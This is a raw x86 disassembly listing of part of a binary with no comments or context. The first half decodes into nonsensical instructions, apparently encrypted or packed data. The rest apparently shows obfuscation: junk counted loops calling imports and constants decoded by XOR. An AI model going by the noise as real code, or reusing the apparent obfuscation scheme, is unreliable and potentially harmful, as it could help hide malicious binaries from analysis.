  41e02c:	adc    al,0xf
  41e02e:	out    0x3a,eax
  41e030:	push   ebp
  41e031:	xchg   DWORD PTR [edx+esi*4+0x914b653],ebp
  41e038:	ret    
  41e039:	pushf  
  41e03a:	mov    ds:0x6a0f1b2b,al
  41e03f:	mov    bl,0xd5
  41e041:	into   
  41e042:	xchg   ecx,eax
  41e043:	jmp    0x617a:0x633ebd72
  41e04a:	inc    edi
  41e04b:	dec    edx
  41e04c:	or     eax,0xe3f686f8
  41e051:	(bad)  
  41e052:	retf   0x6d67
  41e055:	imul   edx,DWORD PTR [ebx+0x39],0xd75a24b6
  41e05c:	shr    ch,0xf3
  41e05f:	imul   esi,DWORD PTR [ecx],0x40b27731
  41e065:	add    eax,ebp
  41e067:	jmp    0xfc3d8a4b
  41e06c:	outs   dx,BYTE PTR ds:[esi]
  41e06d:	jle    0x41e0ad
  41e06f:	fnsave [edx+ebp*1+0x3f580557]
  41e076:	jp     0x41e074
  41e078:	lds    edx,FWORD PTR [edi+esi*2+0x44]
  41e07c:	push   ds
  41e07d:	cmp    bl,BYTE PTR [esi-0x53ca3b38]
  41e083:	ins    DWORD PTR es:[edi],dx
  41e084:	fmul   QWORD PTR [edi+0x14216e46]
  41e08a:	dec    edi
  41e08b:	jbe    0x41e02b
  41e08d:	sar    DWORD PTR [esi-0x4890b532],0xe3
  41e094:	leave  
  41e095:	xor    al,0xaf
  41e097:	dec    eax
  41e098:	(bad)  
  41e099:	mov    esi,DWORD PTR [edx+0x43]
  41e09c:	jmp    0xe753:0x5719a75d
  41e0a3:	cmp    eax,0x6736ed12
  41e0a8:	dec    esi
  41e0a9:	mov    eax,?
  41e0ab:	pop    ecx
  41e0ac:	or     BYTE PTR [ecx],bh
  41e0ae:	ficomp DWORD PTR [ecx+ebp*4+0x5c8e7733]
  41e0b5:	inc    ebx
  41e0b6:	gs into 
  41e0b8:	stos   DWORD PTR es:[edi],eax
  41e0b9:	push   edi
  41e0ba:	(bad)  
  41e0bb:	int3   
  41e0bc:	pop    eax
  41e0bd:	(bad)  
  41e0be:	pop    esp
  41e0bf:	scas   eax,DWORD PTR es:[edi]
  41e0c0:	stos   DWORD PTR es:[edi],eax
  41e0c1:	ja     0x41e056
  41e0c3:	and    BYTE PTR [edi-0x7c],ch
  41e0c6:	sbb    eax,DWORD PTR [edx+0x4d]
  41e0c9:	sub    BYTE PTR [eax],al
  41e0cb:	pop    edx
  41e0cc:	sbb    esi,ebp
  41e0ce:	adc    al,BYTE PTR [edi-0x3e4ce68]
  41e0d4:	xlat   BYTE PTR ds:[ebx]
  41e0d5:	push   eax
  41e0d6:	push   ds
  41e0d7:	jmp    0x41e14c
  41e0d9:	das    
  41e0da:	scas   al,BYTE PTR es:[edi]
  41e0db:	xchg   esi,eax
  41e0dc:	push   ebx
  41e0dd:	cmc    
  41e0de:	lahf   
  41e0df:	jo     0x41e0e8
  41e0e1:	in     al,0x6c
  41e0e3:	iret   
  41e0e4:	xor    ch,BYTE PTR [eax+0x41]
  41e0e7:	push   ecx
  41e0e8:	daa    
  41e0e9:	mov    ds:0x7a0a2614,eax
  41e0ee:	or     cl,BYTE PTR [eax+0x18e4a116]
  41e0f4:	jle    0x41e109
  41e0f6:	pop    ebp
  41e0f7:	push   eax
  41e0f8:	js     0x41e0a8
  41e0fa:	inc    ebp
  41e0fb:	stc    
  41e0fc:	mov    ecx,0xeef62cb6
  41e101:	scas   al,BYTE PTR es:[edi]
  41e102:	pop    esi
  41e103:	add    BYTE PTR [ecx-0x731963f7],0xba
  41e10a:	and    eax,0xd3f251c0
  41e10f:	bswap  ecx
  41e111:	sahf   
  41e112:	ficom  WORD PTR [ecx]
  41e114:	stc    
  41e115:	dec    esp
  41e116:	pop    eax
  41e117:	aas    
  41e118:	imul   ecx,DWORD PTR [ecx+0x31],0x71
  41e11c:	aaa    
  41e11d:	imul   ecx,DWORD PTR ds:0x8d8c2d39,0x705d0a01
  41e127:	popf   
  41e128:	stc    
  41e129:	mov    esi,ecx
  41e12b:	fcomp  DWORD PTR [edi-0x558311f9]
  41e131:	in     al,dx
  41e132:	mov    ebp,0xf13e96c3
  41e137:	dec    edi
  41e138:	mov    edx,fs
  41e13a:	pop    es
  41e13b:	dec    DWORD PTR [ecx+0x1e]
  41e13e:	mul    DWORD PTR [edx+0xd]
  41e141:	xchg   ecx,eax
  41e142:	or     ebx,DWORD PTR [ebx-0x21]
  41e145:	or     BYTE PTR [eax],ah
  41e147:	iret   
  41e148:	and    BYTE PTR [ecx-0x7f],dh
  41e14b:	jg     0x41e0d3
  41e14d:	ins    BYTE PTR es:[edi],dx
  41e14e:	xchg   edi,eax
  41e14f:	popf   
  41e150:	stc    
  41e151:	in     eax,0x64
  41e153:	jp     0x41e0e0
  41e155:	sbb    DWORD PTR [ecx+0x1ba3edc3],0x897692d1
  41e15f:	pop    ss
  41e160:	cmp    eax,0x6dc24915
  41e165:	cmp    esi,DWORD PTR [eax]
  41e167:	(bad)  
  41e168:	les    edi,FWORD PTR [esi]
  41e16a:	test   eax,0xe3bf2e61
  41e16f:	mov    ebx,0xa4b38417
  41e174:	push   ss
  41e175:	jle    0x41e15d
  41e177:	sbb    eax,esi
  41e179:	or     al,0x2e
  41e17b:	nop
  41e17c:	ret    0x6a6a
  41e17f:	pop    esi
  41e180:	push   ds
  41e181:	and    DWORD PTR [esi],edx
  41e183:	adc    BYTE PTR [ebp+0x20],ch
  41e186:	lahf   
  41e187:	loop   0x41e200
  41e189:	in     al,dx
  41e18a:	fcomp  st(6)
  41e18c:	push   esp
  41e18d:	inc    ecx
  41e18e:	cmp    DWORD PTR [edi-0x33c9f4d8],0xada8087c
  41e198:	pop    ecx
  41e199:	or     al,0xdb
  41e19b:	std    
  41e19c:	cmp    DWORD PTR [edi],edx
  41e19e:	jnp    0x41e1b7
  41e1a0:	xor    eax,0xf02e4b01
  41e1a5:	pop    ds
  41e1a6:	inc    esp
  41e1a7:	cld    
  41e1a8:	shr    dh,1
  41e1aa:	bound  edx,QWORD PTR [ecx-0x31a3dd0d]
  41e1b0:	fwait
  41e1b1:	push   0xffffffa6
  41e1b3:	adc    eax,0xc3018436
  41e1b8:	aad    0xaa
  41e1ba:	jmp    0x3232778f
  41e1bf:	loope  0x41e145
  41e1c1:	push   edi
  41e1c2:	lock loop 0x41e1f0
  41e1c5:	jp     0x41e178
  41e1c7:	mov    al,ds:0x9dd3d133
  41e1cc:	inc    esi
  41e1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ce:	jnp    0x41e202
  41e1d0:	xchg   ebp,eax
  41e1d1:	jno    0x41e1e6
  41e1d3:	adc    al,0x80
  41e1d5:	lock add esi,DWORD PTR [eax]
  41e1d8:	push   ss
  41e1d9:	jbe    0x41e190
  41e1db:	mov    esp,0xecae817d
  41e1e0:	in     al,dx
  41e1e1:	mov    ds:0x40df3e8f,eax
  41e1e6:	retf   0xe188
  41e1e9:	stc    
  41e1ea:	xlat   BYTE PTR ds:[ebx]
  41e1eb:	inc    edi
  41e1ec:	mov    al,0x1a
  41e1ee:	xlat   BYTE PTR ds:[ebx]
  41e1ef:	call   FWORD PTR [eax-0x50644964]
  41e1f5:	and    edi,DWORD PTR [ecx-0x1a60c8ef]
  41e1fb:	and    DWORD PTR [eax+0x39],ecx
  41e1fe:	pop    eax
  41e1ff:	dec    ecx
  41e200:	sbb    DWORD PTR [ebx],ebx
  41e202:	fnstenv [eax]
  41e204:	pushf  
  41e205:	ret    0xa4e5
  41e208:	adc    BYTE PTR [ebp-0x48],0x1d
  41e20c:	jbe    0x41e216
  41e20e:	jle    0x41e1af
  41e210:	pop    ds
  41e211:	push   0xfffffffd
  41e213:	adc    cl,BYTE PTR [esi]
  41e215:	scas   al,BYTE PTR es:[edi]
  41e216:	or     DWORD PTR [ebx-0x5e4edd62],esi
  41e21c:	mov    ds:0xfab234df,al
  41e221:	adc    ch,BYTE PTR [ecx+ebx*1+0x1c]
  41e225:	lea    esp,[edx-0x24]
  41e228:	(bad)  
  41e229:	or     dh,al
  41e22b:	pop    edi
  41e22c:	push   esi
  41e22d:	mov    ch,0x10
  41e22f:	mov    ah,0x21
  41e231:	add    ebp,DWORD PTR [edx]
  41e233:	pop    esp
  41e234:	or     esp,esp
  41e236:	in     eax,0x7c
  41e238:	ins    BYTE PTR es:[edi],dx
  41e239:	dec    edi
  41e23a:	add    DWORD PTR [ecx],esi
  41e23c:	arpl   WORD PTR [ebp-0x79],dx
  41e23f:	popa   
  41e240:	mov    esp,0x29cdbbf9
  41e245:	es pop edx
  41e247:	and    DWORD PTR [esi-0x80],0xfffffff5
  41e24b:	out    dx,al
  41e24c:	push   ds
  41e24d:	dec    eax
  41e24e:	fbld   TBYTE PTR [esi]
  41e250:	fld    DWORD PTR [ecx-0x3c]
  41e253:	xchg   esi,eax
  41e254:	sbb    BYTE PTR [edi],ch
  41e256:	sub    esp,DWORD PTR [ebp-0x50b3f49e]
  41e25c:	ins    DWORD PTR es:[edi],dx
  41e25d:	addr16 or eax,0x483e1c54
  41e263:	loope  0x41e2b1
  41e265:	daa    
  41e266:	jle    0x41e2bf
  41e268:	xor    al,0x17
  41e26a:	push   edx
  41e26b:	dec    ebx
  41e26c:	xlat   BYTE PTR ds:[ebx]
  41e26d:	jo     0x41e22f
  41e26f:	loope  0x41e2dc
  41e271:	je     0x41e299
  41e273:	dec    esp
  41e274:	imul   esp,DWORD PTR [ebp+ebx*8+0x63a9756c],0x8b5b1dfc
  41e27f:	push   ebx
  41e280:	xchg   BYTE PTR es:[edi-0x2d],bh
  41e284:	mov    bh,0x46
  41e286:	nop
  41e287:	enter  0xf402,0x5b
  41e28b:	ret    
  41e28c:	jae    0x41e2a3
  41e28e:	ss js  0x41e302
  41e291:	sti    
  41e292:	into   
  41e293:	out    0x65,eax
  41e295:	sub    eax,eax
  41e297:	mov    DWORD PTR [edi-0xbdde3aa],ecx
  41e29d:	mov    dh,0x77
  41e29f:	fcomp  DWORD PTR [edi+0x194bd440]
  41e2a5:	adc    ecx,DWORD PTR ss:[edx]
  41e2a8:	mov    dl,0xb0
  41e2aa:	ret    0x613
  41e2ad:	xor    BYTE PTR [ecx],ch
  41e2af:	mov    bh,0x5d
  41e2b1:	iret   
  41e2b2:	arpl   WORD PTR [ebx+0x36b63c34],di
  41e2b8:	dec    ebx
  41e2b9:	mov    WORD PTR [edx+edi*1],ss
  41e2bc:	mov    bh,0x87
  41e2be:	or     DWORD PTR [edx+0x33ae5d79],eax
  41e2c4:	push   ecx
  41e2c5:	int    0xa7
  41e2c7:	sti    
  41e2c8:	repnz inc ecx
  41e2ca:	and    DWORD PTR [edx-0x1747519c],0x10ebd301
  41e2d4:	adc    bh,al
  41e2d6:	out    0xe7,eax
  41e2d8:	push   ecx
  41e2d9:	push   ds
  41e2da:	inc    esi
  41e2db:	mov    cs,WORD PTR [esi]
  41e2dd:	cmp    eax,0x73c37e5e
  41e2e2:	test   eax,0x1c87eba1
  41e2e7:	scas   al,BYTE PTR es:[edi]
  41e2e8:	dec    eax
  41e2e9:	clc    
  41e2ea:	iret   
  41e2eb:	adc    DWORD PTR [eax],eax
  41e2ed:	xor    eax,0x95c4afc0
  41e2f2:	(bad)  
  41e2f3:	fldenv [edi+0x29]
  41e2f6:	shl    al,0x60
  41e2f9:	and    ebp,esi
  41e2fb:	fxtract 
  41e2fd:	pushf  
  41e2fe:	iret   
  41e2ff:	mov    edi,0x7cf5e55d
  41e304:	fstp   DWORD PTR [ebx+0x55]
  41e307:	pop    ebx
  41e308:	fisubr WORD PTR [ebx-0x66fac87f]
  41e30e:	mov    ebp,DWORD PTR [esi-0x70]
  41e311:	pop    edi
  41e312:	cmp    dl,dl
  41e314:	lds    esi,FWORD PTR [ebp-0x36]
  41e317:	out    dx,al
  41e318:	lods   eax,DWORD PTR ds:[esi]
  41e319:	ret    0x41ee
  41e31c:	pop    edi
  41e31d:	call   0xae2b7147
  41e322:	or     DWORD PTR [eax+edi*2],ecx
  41e325:	mov    al,0x3a
  41e327:	inc    ebx
  41e328:	mov    dl,0x96
  41e32a:	add    BYTE PTR [ebp-0x47804b13],dl
  41e330:	mov    esp,0xb133eebe
  41e335:	gs push ebp
  41e338:	push   ecx
  41e339:	mov    ebx,0x5f46dbef
  41e33e:	fild   WORD PTR [ebp+0x5]
  41e341:	mov    ebp,0xe79e3fc8
  41e346:	retf   0x77c2
  41e349:	imul   eax,ebp,0x6f
  41e34c:	mov    al,ds:0x320f35f8
  41e351:	cmp    edx,ebp
  41e353:	bound  ebx,QWORD PTR [edx-0x1c]
  41e356:	sub    bl,BYTE PTR [ebx]
  41e358:	les    ecx,FWORD PTR [edx]
  41e35a:	and    ebp,DWORD PTR [ebx-0x1cda41b1]
  41e360:	test   DWORD PTR [edi-0x7a],ecx
  41e363:	jb     0x41e322
  41e365:	retf   
  41e366:	jg     0x41e34c
  41e368:	inc    esi
  41e369:	adc    eax,0x151a070e
  41e36e:	sbb    eax,0xc6a4e530
  41e373:	adc    edi,DWORD PTR [ecx+eax*8-0x5]
  41e377:	les    ebx,FWORD PTR [eax]
  41e379:	jno    0x41e306
  41e37b:	cli    
  41e37c:	(bad)  
  41e37d:	idiv   BYTE PTR [ebp+ecx*2+0x75]
  41e381:	cli    
  41e382:	mov    cl,BYTE PTR [eax-0x4098cb37]
  41e388:	sub    esp,ecx
  41e38a:	icebp  
  41e38b:	cmp    DWORD PTR [esi-0x76],eax
  41e38e:	mov    esp,0x360f97f8
  41e393:	mov    edi,DWORD PTR [edx+0x3d]
  41e396:	mov    ch,0x34
  41e398:	in     al,dx
  41e399:	sbb    ecx,DWORD PTR [bx+si-0x71]
  41e39d:	push   ecx
  41e39e:	pushf  
  41e39f:	push   cs
  41e3a0:	pop    ds
  41e3a1:	sub    DWORD PTR [edx],esp
  41e3a3:	mov    cl,0x35
  41e3a5:	loop   0x41e34c
  41e3a7:	add    al,0xae
  41e3a9:	std    
  41e3aa:	mov    ds:0x7753619,eax
  41e3af:	icebp  
  41e3b0:	or     esp,ebx
  41e3b2:	sbb    BYTE PTR [esi-0x5d7077ba],bl
  41e3b8:	inc    eax
  41e3b9:	pop    eax
  41e3ba:	jb     0x41e390
  41e3bc:	stos   DWORD PTR es:[edi],eax
  41e3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3be:	shl    cl,cl
  41e3c0:	push   esi
  41e3c1:	in     eax,0xd1
  41e3c3:	cmp    cl,BYTE PTR [edx-0x3]
  41e3c6:	call   0x51c9:0xd1b434d5
  41e3cd:	mov    cl,0xb4
  41e3cf:	or     ebp,DWORD PTR [ebx+0x48]
  41e3d2:	xor    esi,DWORD PTR [esi+0x6e4d2a49]
  41e3d8:	xchg   esi,eax
  41e3d9:	outs   dx,DWORD PTR ds:[esi]
  41e3da:	sub    esp,DWORD PTR [edi]
  41e3dc:	outs   dx,DWORD PTR ds:[esi]
  41e3dd:	iret   
  41e3de:	ror    ecx,cl
  41e3e0:	stos   DWORD PTR es:[edi],eax
  41e3e1:	mov    bl,0xf9
  41e3e3:	or     DWORD PTR [eax],edi
  41e3e5:	dec    ecx
  41e3e6:	loop   0x41e400
  41e3e8:	aas    
  41e3e9:	adc    DWORD PTR [esi+edi*8],0xffffff87
  41e3ed:	retf   
  41e3ee:	fbld   TBYTE PTR [ebx]
  41e3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3f1:	jne    0x41e3e8
  41e3f3:	fwait
  41e3f4:	rcl    si,cl
  41e3f7:	lahf   
  41e3f8:	iret   
  41e3f9:	add    eax,0xb068b4a9
  41e3fe:	shl    DWORD PTR [ecx],0xd4
  41e401:	dec    ecx
  41e402:	push   ebx
  41e403:	mov    DWORD PTR [ebp-0x20],eax
  41e406:	mov    DWORD PTR ds:0x429028,0x1e
  41e410:	cmp    DWORD PTR ds:0x429028,0x0
  41e417:	je     0x41e45f
  41e41d:	cmp    DWORD PTR ds:0x429028,0x2e
  41e424:	jne    0x41e43f
  41e42a:	push   0x88e3
  41e42f:	push   0x5900
  41e434:	push   0x6949
  41e439:	call   DWORD PTR ds:0x425044
  41e43f:	mov    eax,ds:0x429028
  41e444:	dec    eax
  41e445:	mov    ds:0x429028,eax
  41e44a:	jmp    0x41e410
  41e44f:	mov    eax,ds:0x4245a1
  41e454:	mov    ecx,DWORD PTR ds:0x423e3e
  41e45a:	sub    ecx,eax
  41e45c:	or     eax,DWORD PTR [eax+ecx*1]
  41e45f:	mov    eax,ds:0x42407a
  41e464:	mov    eax,DWORD PTR [eax]
  41e466:	mov    DWORD PTR [ebp-0x28],eax
  41e469:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  41e470:	mov    eax,DWORD PTR [ebp-0x38]
  41e473:	mov    DWORD PTR ds:0x42b004,0x13
  41e47d:	cmp    DWORD PTR ds:0x42b004,0x0
  41e484:	je     0x41e4fb
  41e48a:	cmp    DWORD PTR ds:0x42b004,0x19
  41e491:	jne    0x41e4ad
  41e497:	push   0x8602
  41e49c:	push   DWORD PTR [ebp-0x28]
  41e49f:	push   DWORD PTR [ebp-0x18]
  41e4a2:	push   0x5ed1
  41e4a7:	call   DWORD PTR ds:0x425048
  41e4ad:	mov    ecx,DWORD PTR ds:0x42b004
  41e4b3:	dec    ecx
  41e4b4:	mov    DWORD PTR ds:0x42b004,ecx
  41e4ba:	jmp    0x41e47d
  41e4bf:	and    DWORD PTR ds:0x42d010,0x0
  41e4c9:	mov    ecx,DWORD PTR ds:0x42d010
  41e4cf:	inc    ecx
  41e4d0:	mov    DWORD PTR ds:0x42d010,ecx
  41e4d6:	cmp    DWORD PTR ds:0x42d010,0x1d
  41e4dd:	jne    0x41e4ee
  41e4e3:	push   0x7e2c
  41e4e8:	call   DWORD PTR ds:0x42504c
  41e4ee:	cmp    DWORD PTR ds:0x42d010,0x1c
  41e4f5:	jb     0x41e4c9
  41e4fb:	xor    eax,esi
  41e4fd:	and    DWORD PTR ds:0x429008,0x0
  41e507:	jmp    0x41e519
  41e50c:	mov    ecx,DWORD PTR ds:0x429008
  41e512:	inc    ecx
  41e513:	mov    DWORD PTR ds:0x429008,ecx
  41e519:	cmp    DWORD PTR ds:0x429008,0x14
  41e520:	jae    0x41e568
  41e526:	cmp    DWORD PTR ds:0x429008,0xb
  41e52d:	jne    0x41e543
  41e533:	push   0x3d49
  41e538:	push   0x424381
  41e53d:	call   DWORD PTR ds:0x425010
  41e543:	cmp    DWORD PTR ds:0x429008,0xa
  41e54a:	jne    0x41e55d
  41e550:	mov    ecx,DWORD PTR ds:0x429008
  41e556:	inc    ecx
  41e557:	mov    DWORD PTR ds:0x429008,ecx
  41e55d:	jmp    0x41e50c
  41e562:	and    ecx,0x72e7
  41e568:	add    eax,edi
  41e56a:	xor    DWORD PTR ds:0x42c010,0x649e
  41e574:	mov    DWORD PTR [ebp-0x30],eax
  41e577:	mov    ecx,DWORD PTR ds:0x429028
  41e57d:	xor    DWORD PTR ds:0x42b018,ecx
  41e583:	mov    eax,ds:0x423ff2
  41e588:	sbb    ecx,0x5dc9
  41e58e:	mov    DWORD PTR [ebp-0x30],eax
  41e591:	sub    eax,eax
  41e593:	mov    eax,DWORD PTR [ebp-0x20]
  41e596:	mov    DWORD PTR [ebp-0x14],eax
  41e599:	mov    eax,DWORD PTR [ebp-0x14]
  41e59c:	push   0x4
  41e59e:	not    ecx
  41e5a0:	pop    ecx
  41e5a1:	adc    DWORD PTR ds:0x42a004,0x37d1
  41e5ab:	sub    ecx,eax
  41e5ad:	add    ecx,DWORD PTR [ebp-0x28]
  41e5b0:	mov    eax,ds:0x429024
  41e5b5:	or     DWORD PTR ds:0x42a008,eax
  41e5bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41e5c2:	mov    DWORD PTR ds:0x42a008,0x13
  41e5cc:	cmp    DWORD PTR ds:0x42a008,0x0
  41e5d3:	je     0x41e627
  41e5d9:	cmp    DWORD PTR ds:0x42a008,0x9
  41e5e0:	jne    0x41e5f6
  41e5e6:	push   0x665a
  41e5eb:	push   0x4c85
  41e5f0:	call   DWORD PTR ds:0x425018
  41e5f6:	cmp    DWORD PTR ds:0x42a008,0xa
  41e5fd:	jne    0x41e60e
  41e603:	mov    eax,ds:0x42a008
  41e608:	dec    eax
  41e609:	mov    ds:0x42a008,eax
  41e60e:	xor    eax,eax
  41e610:	xor    eax,DWORD PTR ds:0x42a008
  41e616:	dec    eax
  41e617:	mov    ds:0x42a008,eax
  41e61c:	jmp    0x41e5cc
  41e621:	and    DWORD PTR ds:0x42c018,edi
  41e627:	mov    DWORD PTR [ebp-0x24],ecx
  41e62a:	and    DWORD PTR ds:0x42b000,0x4083
  41e634:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  41e63e:	mov    eax,DWORD PTR [ebp-0x14]
  41e641:	sub    DWORD PTR ds:0x429028,0x42c00c
  41e64b:	mov    DWORD PTR [ebp-0x94],eax
  41e651:	mov    DWORD PTR ds:0x429018,0x60a2
  41e65b:	mov    eax,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x90],eax
  41e664:	sub    eax,0x1a7d
  41e669:	mov    eax,DWORD PTR [ebp-0x2c]
  41e66c:	add    DWORD PTR ds:0x429014,0x42b010
  41e676:	xor    eax,esi
  41e678:	add    eax,edi
  41e67a:	or     DWORD PTR ds:0x42a01c,0xdce
  41e684:	mov    DWORD PTR [ebp-0x8c],eax
  41e68a:	xor    DWORD PTR ds:0x42d004,0x42a000
  41e694:	lea    eax,[ebp-0x50]
  41e697:	sub    DWORD PTR ds:0x429020,0x429004
  41e6a1:	mov    DWORD PTR [ebp-0x88],eax
  41e6a7:	sub    DWORD PTR ds:0x429028,0x1657
  41e6b1:	mov    eax,DWORD PTR [ebp-0x98]
  41e6b7:	xor    eax,esi
  41e6b9:	sub    DWORD PTR ds:0x42c01c,0x42d010
  41e6c3:	add    eax,edi
  41e6c5:	mov    DWORD PTR [ebp-0x98],eax
  41e6cb:	and    DWORD PTR ds:0x42d004,0x42b004
  41e6d5:	lea    eax,[ebp-0x98]
  41e6db:	sbb    DWORD PTR ds:0x42d008,0x429018
  41e6e5:	push   eax
  41e6e6:	and    DWORD PTR ds:0x42c004,edi
  41e6ec:	mov    eax,DWORD PTR [ebp+0xc]
  41e6ef:	sub    DWORD PTR ds:0x42b014,0x42a01c
  41e6f9:	xor    eax,esi
  41e6fb:	add    eax,edi
  41e6fd:	sbb    DWORD PTR ds:0x429024,0x42c01c
  41e707:	push   eax
  41e708:	and    eax,DWORD PTR ds:0x42c018
  41e70e:	mov    eax,ds:0x424012
  41e713:	adc    DWORD PTR ds:0x429004,0x7be0
  41e71d:	push   0x423f68
  41e722:	and    DWORD PTR ds:0x429000,0x42b018
  41e72c:	push   DWORD PTR [eax]
  41e72e:	xor    DWORD PTR ds:0x42c014,0x72b4
  41e738:	call   0x40867e
  41e73d:	inc    eax
  41e73e:	mov    eax,DWORD PTR [ebp-0x14]
  41e741:	add    ecx,DWORD PTR ds:0x42b00c
  41e747:	mov    ecx,DWORD PTR [ebp-0x24]
  41e74a:	mov    DWORD PTR [ebp-0x4c],ecx
  41e74d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e750:	xor    DWORD PTR ds:0x429020,0x42a008
  41e75a:	xor    ecx,esi
  41e75c:	mov    DWORD PTR [ebp-0x38],eax
  41e75f:	xor    DWORD PTR ds:0x42c014,0x42a014
  41e769:	add    ecx,edi
  41e76b:	jmp    0x423b72
  41e770:	adc    ebx,DWORD PTR ds:0x429018
  41e776:	lea    edx,[ecx+eax*1]
  41e779:	mov    DWORD PTR ds:0x42d000,0x1d
  41e783:	cmp    DWORD PTR ds:0x42d000,0x0
  41e78a:	je     0x41e7ca
  41e790:	cmp    DWORD PTR ds:0x42d000,0x24
  41e797:	jne    0x41e7b0
  41e79d:	push   0x42a008
  41e7a2:	push   DWORD PTR [ebp-0x14]
  41e7a5:	push   0x42439d
  41e7aa:	call   DWORD PTR ds:0x42501c
  41e7b0:	xor    ebx,ebx
  41e7b2:	add    ebx,DWORD PTR ds:0x42d000
  41e7b8:	dec    ebx
  41e7b9:	mov    DWORD PTR ds:0x42d000,ebx
  41e7bf:	jmp    0x41e783
  41e7c4:	and    DWORD PTR ds:0x42c010,ecx
  41e7ca:	mov    DWORD PTR [ebp-0x28],edx
  41e7cd:	sub    edx,ebx
  41e7cf:	mov    edx,DWORD PTR [ebp-0x4c]
  41e7d2:	and    DWORD PTR ds:0x42d00c,0x0
  41e7dc:	jmp    0x41e7ee
  41e7e1:	mov    ebx,DWORD PTR ds:0x42d00c
  41e7e7:	inc    ebx
  41e7e8:	mov    DWORD PTR ds:0x42d00c,ebx
  41e7ee:	cmp    DWORD PTR ds:0x42d00c,0x19
  41e7f5:	jae    0x41e843
  41e7fb:	cmp    DWORD PTR ds:0x42d00c,0xe
  41e802:	jne    0x41e818
  41e808:	push   0x42901c
  41e80d:	push   0x4df2
  41e812:	call   DWORD PTR ds:0x425020
  41e818:	cmp    DWORD PTR ds:0x42d00c,0xd
  41e81f:	jne    0x41e834
  41e825:	xor    ebx,ebx
  41e827:	xor    ebx,DWORD PTR ds:0x42d00c
  41e82d:	inc    ebx
  41e82e:	mov    DWORD PTR ds:0x42d00c,ebx
  41e834:	jmp    0x41e7e1
  41e839:	sbb    DWORD PTR ds:0x42d00c,0x42a014
  41e843:	sub    edx,ecx
  41e845:	sbb    DWORD PTR ds:0x429014,ebx
  41e84b:	mov    DWORD PTR [ebp-0x20],edx
  41e84e:	and    DWORD PTR ds:0x42d01c,0x0
  41e858:	mov    edx,DWORD PTR ds:0x42d01c
  41e85e:	inc    edx
  41e85f:	mov    DWORD PTR ds:0x42d01c,edx
  41e865:	cmp    DWORD PTR ds:0x42d01c,0x8
  41e86c:	jne    0x41e87b
  41e872:	push   DWORD PTR [ebp-0x10]
  41e875:	call   DWORD PTR ds:0x425028
  41e87b:	cmp    DWORD PTR ds:0x42d01c,0x7
  41e882:	jne    0x41e897
  41e888:	xor    edx,edx
  41e88a:	or     edx,DWORD PTR ds:0x42d01c
  41e890:	inc    edx
  41e891:	mov    DWORD PTR ds:0x42d01c,edx
  41e897:	cmp    DWORD PTR ds:0x42d01c,0x11
  41e89e:	jb     0x41e858
  41e8a4:	mov    edx,DWORD PTR [ebp-0x20]
  41e8a7:	mov    DWORD PTR [ebp-0x14],edx
  41e8aa:	mov    edx,DWORD PTR [ebp-0x28]
  41e8ad:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  41e8b4:	mov    DWORD PTR [ebp-0x44],edx
  41e8b7:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41e8be:	mov    edx,DWORD PTR [ebp-0x34]
  41e8c1:	xor    edx,esi
  41e8c3:	add    edx,edi
  41e8c5:	mov    DWORD PTR [ebp-0x10],edx
  41e8c8:	mov    edx,DWORD PTR [ebp-0x34]
  41e8cb:	xor    edx,esi
  41e8cd:	add    edx,edi
  41e8cf:	mov    DWORD PTR [ebp-0x8],edx
  41e8d2:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41e8d9:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41e8e0:	mov    edx,DWORD PTR [ebp-0x34]
  41e8e3:	mov    ebx,DWORD PTR [ebp-0x14]
  41e8e6:	xor    edx,esi
  41e8e8:	add    edx,edi
  41e8ea:	cmp    ebx,edx
  41e8ec:	je     0x423b66
  41e8f2:	mov    eax,DWORD PTR [ebp-0x18]
  41e8f5:	xor    eax,esi
  41e8f7:	mov    edx,0xffcd8d25
  41e8fc:	sub    edx,eax
  41e8fe:	add    edx,DWORD PTR [ebp-0x14]
  41e901:	mov    eax,DWORD PTR [ebp-0x18]
  41e904:	mov    ebx,DWORD PTR [ebp-0x10]
  41e907:	xor    eax,esi
  41e909:	add    eax,edi
  41e90b:	imul   eax,ebx
  41e90e:	cmp    eax,edx
  41e910:	ja     0x423b63
  41e916:	mov    edx,DWORD PTR [ebp-0x10]
  41e919:	mov    eax,DWORD PTR [ebp-0x14]
  41e91c:	mov    ebx,DWORD PTR [ebp-0x28]
  41e91f:	sub    eax,edx
  41e921:	xor    ebx,esi
  41e923:	xor    edx,edx
  41e925:	add    ebx,edi
  41e927:	div    ebx
  41e929:	mov    DWORD PTR [ebp-0x8],eax
  41e92c:	mov    eax,DWORD PTR [ebp-0x2c]
  41e92f:	mov    edx,DWORD PTR [ebp-0x8]
  41e932:	xor    eax,esi
  41e934:	add    eax,edi
  41e936:	cmp    edx,eax
  41e938:	jbe    0x41e948
  41e93e:	mov    eax,DWORD PTR [ebp-0x2c]
  41e941:	xor    eax,esi
  41e943:	add    eax,edi
  41e945:	mov    DWORD PTR [ebp-0x8],eax
  41e948:	mov    eax,DWORD PTR [ebp-0x28]
  41e94b:	mov    edx,DWORD PTR [ebp-0x8]
  41e94e:	xor    eax,esi
  41e950:	add    eax,edi
  41e952:	imul   eax,edx
  41e955:	mov    DWORD PTR [ebp-0x8],eax
  41e958:	mov    eax,DWORD PTR [ebp-0x34]
  41e95b:	mov    edx,DWORD PTR [ebp-0x8]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    edx,eax
  41e964:	je     0x423b4c
  41e96a:	mov    eax,DWORD PTR [ebp-0x8]
  41e96d:	mov    DWORD PTR [ebp-0x24],eax
  41e970:	mov    eax,DWORD PTR [ebp-0x10]
  41e973:	add    eax,DWORD PTR [ebp-0x44]
  41e976:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41e97d:	mov    DWORD PTR [ebp-0x8],eax
  41e980:	mov    eax,0xf89c85b5
  41e985:	mov    DWORD PTR [ebp-0x3c],eax
